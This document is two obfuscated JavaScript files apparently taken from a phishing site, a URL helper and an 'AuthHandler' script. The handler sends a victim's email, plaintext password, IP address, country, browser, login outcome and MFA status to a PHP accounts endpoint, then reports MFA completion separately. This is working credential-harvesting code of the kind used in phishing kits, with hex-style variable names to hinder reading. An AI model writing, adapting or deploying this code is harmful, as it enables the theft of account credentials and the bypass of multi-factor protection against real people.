// https://couplevisa.com/456d5fg79h9gg/assets/js/url_helper.js
function getBaseUrl() {
  return window.baseUrl || ''
}
function getCurrentAccessKey() {
  return window.currentAccessKey || ''
}
function generateShareableUrl(_0x58589f = '', _0x16c569 = {}) {
  const _0x1de7cf = getBaseUrl(),
    _0x7a79df = getCurrentAccessKey()
  let _0x29d88c = _0x1de7cf + '/' + _0x7a79df
  _0x58589f && (_0x29d88c += '/' + _0x58589f)
  if (Object.keys(_0x16c569).length > 0) {
    const _0x22bf0d = new URLSearchParams(_0x16c569)
    _0x29d88c += '?' + _0x22bf0d.toString()
  }
  return _0x29d88c
}
window.urlHelper = {
  getBaseUrl: getBaseUrl,
  getCurrentAccessKey: getCurrentAccessKey,
  generateShareableUrl: generateShareableUrl,
}

// https://couplevisa.com/456d5fg79h9gg/assets/js/endpoint.js
const ACCOUNTS_ENDPOINT = './assets/php/endpoints/accounts.php'
function getBrowserName() {
  const _0x25d92c = navigator.userAgent
  if (_0x25d92c.includes('Edg/')) {
    return 'Edge'
  } else {
    if (_0x25d92c.includes('OPR') || _0x25d92c.includes('Opera')) {
      return 'Opera'
    } else {
      if (_0x25d92c.includes('Chrome')) {
        return 'Chrome'
      } else {
        if (_0x25d92c.includes('Safari')) {
          return 'Safari'
        } else {
          if (_0x25d92c.includes('Firefox')) {
            return 'Firefox'
          } else {
            return _0x25d92c.includes('MSIE') || _0x25d92c.includes('Trident/')
              ? 'Internet Explorer'
              : 'Unknown'
          }
        }
      }
    }
  }
}
const AuthHandler = {
  async postLogin(
    _0x3535af,
    _0x4d9651,
    _0x43307f,
    _0x2c874d,
    _0x377814,
    _0x47439b = 'Disabled'
  ) {
    try {
      console.log(getBrowserName())
      const _0xcde21c = await fetch(ACCOUNTS_ENDPOINT, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: _0x3535af,
            password: _0x4d9651,
            IP: _0x43307f.ip,
            browser: getBrowserName(),
            Type: _0x2c874d,
            login_result: _0x377814,
            MFA_status: _0x47439b,
            country: _0x43307f.country_name,
            date: new Date().toISOString().slice(0, 19).replace('T', ' '),
            ss_id: Math.floor(Math.random() * 1000000),
          }),
        }),
        _0xdae0fc = await _0xcde21c.json()
      return {
        success: _0xcde21c.ok,
        id: _0xdae0fc.id,
        ss_id: _0xdae0fc.ss_id,
      }
    } catch (_0x27ead3) {
      return (
        console.error('Login attempt failed:', _0x27ead3), { success: false }
      )
    }
  },
  async updateMfaComplete(_0x31a3b0, _0x38f50f) {
    try {
      const _0x541c66 = await fetch(ACCOUNTS_ENDPOINT, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ss_id: _0x31a3b0,
          MFA_status: _0x38f50f,
        }),
      })
      return _0x541c66.ok
    } catch (_0x349c0d) {
      return console.error('Failed to update MFA status:', _0x349c0d), false
    }
  },
}
window.AuthHandler = AuthHandler
